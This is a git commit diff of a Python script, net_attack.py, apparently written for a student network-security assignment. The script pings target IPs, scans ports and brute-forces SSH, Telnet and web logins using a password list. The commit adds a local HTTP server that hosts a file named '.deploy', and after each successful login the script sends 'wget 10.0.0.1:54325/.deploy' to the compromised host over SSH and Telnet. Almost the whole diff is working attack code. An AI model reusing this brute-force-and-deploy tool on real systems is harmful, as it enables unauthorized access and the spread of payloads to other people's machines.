00ff0bbba65d70cd9c1b9cfec900740d8d398f01
Martin Neville <martin.neville@mycit.ie>
2020-12-05 00:07:28 +0000

    http server

--- net_attack.py
+++ net_attack.py
@@ -2,10 +2,11 @@
 
 from scapy.all import *
 from os import path
-from shutil import copyfile
+from shutil import copyfile, rmtree
 from telnetlib import Telnet
 from paramiko import SSHClient, AutoAddPolicy
 from requests import get, post
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 conf.verb = 0
 
@@ -20,9 +21,10 @@ def main():
     verify_file_exists(ip_file)
 
     ip_list = read_ip_list(ip_file)
+    print("[+] Determining which IP addresses are reachable...")
     ip_list = [ip for ip in ip_list if is_reachable(ip)]
     if not ip_list:
-        print("No reachable IP addresses found in list")
+        print("[!] No reachable IP addresses found from the provided list")
         exit()
 
     ports = arguments[arguments.index("-p") + 1]
@@ -31,24 +33,31 @@ def main():
     username = arguments[arguments.index("-u") + 1]
     password_file = arguments[arguments.index("-f") + 1]
     verify_file_exists(password_file)
+    password_list = get_passwords(password_file)
 
+    if "-d" in arguments:
+        deployment_file = arguments[arguments.index("-d") + 1]
+        deploy_file_to_server(deployment_file)
+    print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
     for ip in ip_list:
+        print("********** %s **********" % ip)
         for port in port_list:
-            print("********** %s **********" % ip)
             port_open = scan_port(ip, port)
             print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
             if port_open:
-                response = ""
+                bruteforce_function = {
+                    22: bruteforce_ssh,
+                    23: bruteforce_telnet,
+                    80: bruteforce_web,
+                    8080: bruteforce_web,
+                    8888: bruteforce_web
+                }[port]
 
-                if port == 22:
-                    response = bruteforce_ssh(ip, port, username, password_file)
-                elif port == 23:
-                    response = bruteforce_telnet(ip, port, username, password_file)
-                elif port == 80:
-                    response = bruteforce_web(ip, port, username, password_file)
-                 
+                response = bruteforce_function(ip, port, username, password_list)
                 if response:
                     print("Successfully logged into port %d with %s" % (port, response))
+
+        print("********** %s **********\n" % ip)
 
 
 def scan_port(ip, port):
@@ -60,67 +69,82 @@ def scan_port(ip, port):
         return False
 
 
-def bruteforce_telnet(ip, port, username, password_list_filename):
+def bruteforce_telnet(ip, port, username, passwords):
     response = ""
+    server_number = int(ip.split(".")[3])
 
     login_prompt = encode_in_ascii("login:")
     username_input = encode_in_ascii("%s\n" % username)
     password_prompt = encode_in_ascii("Password:")
     welcome_output = encode_in_ascii("Welcome to")
 
-    with open(password_list_filename) as reader:
-        passwords = reader.readlines()
-        for password in passwords:
-            connection = Telnet(ip, port=port)
-            connection.read_until(login_prompt)
-            connection.write(username_input)
-            connection.read_until(password_prompt)
-            connection.write(encode_in_ascii(password))
-            banner = connection.read_until(welcome_output, timeout=1)
-            if welcome_output in banner:
-                connection.close()
-                response = "%s:%s" % (username, password.rstrip())
-                break
+    cd_command = encode_in_ascii("cd /home/ubuntu/assign_2\n")
+    pwd_command = encode_in_ascii("pwd\n")
+    pwd_output = encode_in_ascii("assign_2$")
+    wget_command = encode_in_ascii("wget 10.0.0.1:54325/.deploy\n")
 
+    for password in passwords:
+        connection = Telnet(ip, port=port)
+        connection.read_until(login_prompt)
+        connection.write(username_input)
+        connection.read_until(password_prompt)
+        connection.write(encode_in_ascii("%s\n" % password))
+        banner = connection.read_until(welcome_output, timeout=1)
+        if welcome_output in banner:
+            # connection.write(cd_command)
+            # output = connection.read_until(pwd_output, timeout=1)
+            connection.write(wget_command)
             connection.close()
+            # print(output)
+            # print(connection.read_all())
+            response = "%s:%s" % (username, password.rstrip())
+            break
+
+        connection.close()
 
     return response
 
 
-def bruteforce_ssh(ip, port, username, password_list_filename):
+def bruteforce_ssh(ip, port, username, passwords):
     response = ""
-    with open(password_list_filename) as reader:
-        passwords = reader.readlines()
-        for password in passwords:
-            password_clean = password.rstrip()
-            try:
-                client = SSHClient()
-                client.set_missing_host_key_policy(AutoAddPolicy())
-                client.connect(ip, username=username, password=password_clean)
-                response = "%s:%s" % (username, password.rstrip())
-                break
-            except Exception: 
-                pass
-            finally:
-                client.close()
+    server_number = int(ip.split(".")[3])
+    cd_command = "cd /home/%s/assign_2/server_%d\n" % (username, server_number)
+    wget_command = "wget 10.0.0.1:54325/.deploy\n"
+    ls_la_command = "ls -la\n"
+    exit_command = "exit\n"
+    for password in passwords:
+        try:
+            client = SSHClient()
+            client.set_missing_host_key_policy(AutoAddPolicy())
+            client.connect(ip, username=username, password=password, port=port)
+
+            channel = client.invoke_shell()
+            stdin = channel.makefile('wb')
+            stdout = channel.makefile('rb')
+
+            stdin.write('''%s %s %s %s''' % (cd_command, wget_command, ls_la_command, exit_command))
+            print(stdout.read())
+            response = "%s:%s" % (username, password.rstrip())
+            break
+        except Exception:
+            pass
+        finally:
+            client.close()
 
     return response
 
 
-def bruteforce_web(ip, port, username, password_list_filename):
+def bruteforce_web(ip, port, username, passwords):
     response = ""
     base_url = "http://%s:%d" % (ip, port)
     index_url = "%s/index.php" % base_url
     login_url = "%s/login.php" % base_url
-    with open(password_list_filename) as reader:
-        passwords = reader.readlines()
-        for password in passwords:
-            password_clean = password.rstrip()
-            index_response = get(index_url)
-            if index_response.status_code == 200: 
-                login_response = post(login_url, data={"username":username, "password":password_clean})
-                if "Welcome" in login_response.text:
-                    response = "%s:%s" % (username, password.rstrip())
+    for password in passwords:
+        index_response = get(index_url)
+        if index_response.status_code == 200:
+            login_response = post(login_url, data={"username": username, "password": password})
+            if "Welcome" in login_response.text:
+                response = "%s:%s" % (username, password)
 
     return response
 
@@ -133,9 +157,38 @@ def read_ip_list(ip_file):
     return ip_list
 
 
+def get_passwords(password_file):
+    password_list = []
+    with open(password_file) as reader:
+        password_list = reader.read().splitlines()
+
+    return password_list
+
+
 def is_reachable(ip):
     ans = sr1(IP(dst=ip, ttl=64) / ICMP(), timeout=2)
     return ans is not None
+
+
+def deploy_file_to_server(file):
+    current_directory = os.getcwd()
+    current_file_location = "%s/%s" % (current_directory, file)
+    temp_directory = "%s/net_attack_deployment" % current_directory
+    file_name = ".deploy"
+
+    if path.isdir(temp_directory):
+        rmtree(temp_directory)
+
+    os.mkdir(temp_directory)
+    os.chdir(temp_directory)
+    copyfile(current_file_location, file_name)
+
+    server = ("", 54325)
+    http = HTTPServer(server, SimpleHTTPRequestHandler)
+
+    http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
+    http_server_thread.daemon = True
+    http_server_thread.start()
 
 
 def get_ports_from_input(ports_input):
